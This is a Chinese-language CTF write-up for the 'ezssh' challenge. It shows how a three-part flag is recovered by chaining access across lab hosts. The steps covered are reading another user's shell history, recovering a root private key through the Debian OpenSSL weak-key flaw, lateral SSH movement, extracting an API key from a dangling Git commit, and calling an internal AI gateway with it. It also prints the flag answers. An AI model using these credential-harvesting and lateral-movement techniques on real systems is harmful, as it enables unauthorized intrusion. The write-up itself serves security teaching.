# ezssh

## 题目简述

题目是 SSH 多节点环境题，flag 被拆成三段。初始入口是跳板机上的 `guest` 用户，后续需要从运维痕迹中恢复弱 SSH key、横向到 Git 服务器、读取清理不完整的 Git 对象，再通过备份服务器拿到 AI gateway 的运行参数，最终调用内部 API 获得最后一段。

## 解题过程

实例只通过题目给出的 `/instance` 接口获取，不需要扫描 instancer。拿到实例地址后，入口账号为 `guest`。登录后 `sshd_config` 中的 `Match User guest,inuebisu` 会强制执行 `/usr/local/bin/team-gate`，继续校验队伍 token。

进入 bastion 后，`/home/inuebisu/flag1.txt` 存在但 `guest` 无权读取。继续检查可读痕迹：

```bash
cat /home/inuebisu/.bash_history
cat /home/inuebisu/.ssh/authorized_keys
cat /tmp/oldgw-etc/debian_version
```

历史记录显示 `inuebisu` 曾从 `oldgw` 拷贝 `/root/.ssh/id_rsa.pub` 并追加到自己的 `authorized_keys`。同时 `/tmp/oldgw-etc/debian_version` 为 `4.0`，`authorized_keys` 中存在注释为 `root@oldgw` 的 2048-bit RSA 公钥。

Debian 4.0 与 2008 年 Debian OpenSSL PRNG 弱随机数漏洞匹配。该漏洞会让 SSH key 只来自很小的可枚举集合，因此可以对泄露的公钥算 MD5 指纹，再到 Debian 弱 SSH key 集里查对应私钥：

```bash
ssh-keygen -lf oldgw_root.pub -E md5
```

得到的指纹为：

```text
a3ed929a9c89a73f52137abac5565632
```

在 `debian_ssh_rsa_2048_x86.tar.bz2` 中找到对应私钥：

```text
rsa/2048/a3ed929a9c89a73f52137abac5565632-7187
```

使用该私钥以 `inuebisu` 登录 bastion，经过 team token gate 后读取第一段：

```text
ACTF{O1DGw_N3vER_d!E5_
```

`inuebisu` 的 SSH 配置中保存了 `git-01` 的跳转信息，并且当前家目录里仍有可用私钥。继续横向：

```bash
ssh gitops@git-01
cat ~/flag2.txt
```

得到第二段：

```text
h!s70ry_sT!lL_1eaK$_
```

接着检查 `/srv/git/ai-gateway-migration`。当前分支中看不到明文密钥，但仓库对象没有完全清理：

```bash
cd /srv/git/ai-gateway-migration
git fsck --full --no-reflogs
git show c2a830f13bf6382e9f9c703add638f92c82da8fe:.env.production
```

dangling commit 中的 `.env.production` 泄露了 API key：

```text
OPENAI_API_KEY=sk-pandora-k7J2nL9vR4xT1mPq5sB8wY3uA6zC0eI4gH2jK
```

直接用这个 key 访问 `ai-gateway-01:8080` 会返回 `unknown model`，说明还缺模型名或 base URL 配置。继续检查 `gitops` 家目录，发现 `~/.ssh/backup_ro`，该 key 只能通过 SFTP 以 `backup` 用户登录 `backup-01`。`sshd_config` 对该用户强制执行 `internal-sftp -d /archive`，从备份里读取 AI gateway 的 systemd unit：

```bash
sftp -i ~/.ssh/backup_ro backup@backup-01
get ai-gateway-01/etc/systemd/system/ai-gateway.service
```

unit 中的关键环境变量为：

```text
Environment=OPENAI_BASE_URL=http://<题目环境地址>/v1
Environment=OPENAI_MODEL=deepsleep-v8
```

最后使用泄露的 API key、base URL 和 model 调用 `/v1/chat/completions`：

```bash
curl -s "http://<题目环境地址>/v1/chat/completions" \
  -H "Authorization: Bearer sk-pandora-k7J2nL9vR4xT1mPq5sB8wY3uA6zC0eI4gH2jK" \
  -H "Content-Type: application/json" \
  -d '{"model":"deepsleep-v8","messages":[{"role":"user","content":"flag"}]}'
```

服务返回第三段：

```text
@70M1c_b0mBiN9}
```

三段拼接后得到：

```text
ACTF{O1DGw_N3vER_d!E5_h!s70ry_sT!lL_1eaK$_@70M1c_b0mBiN9}
```

## 方法总结

- 核心技巧：把 SSH 横向、Debian OpenSSL 弱 key、Git dangling object 和备份配置泄露串成一条完整凭据链。
- 识别信号：`authorized_keys` 中出现旧系统主机公钥、Git 历史被清理但对象未清理、SFTP-only 备份账号，都是继续找残留凭据或配置的信号。
- 复用要点：环境题不要只看当前目录权限；`.bash_history`、`authorized_keys`、`git fsck`、systemd unit 和备份目录经常保存下一跳所需的信息。
